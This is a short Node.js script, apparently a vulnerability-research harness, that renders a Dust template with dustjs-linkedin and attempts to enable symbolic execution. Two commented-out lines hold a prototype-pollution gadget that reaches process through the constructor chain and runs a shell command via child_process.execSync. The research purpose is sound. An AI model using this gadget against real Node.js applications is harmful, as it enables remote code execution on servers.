var dust = require('dustjs-linkedin');


try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}


// let cmd = "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('sleep 10')"
// Object.prototype.ANY_CODE= [cmd];

const compiled = dust.compile(`{username} is a valid Dust reference.{~n}`);
const tmpl = dust.loadSource(compiled);
dust.render(tmpl, { username: "byc_404" }, (err, out) => {
    if (err) throw err;
    console.log(out);
});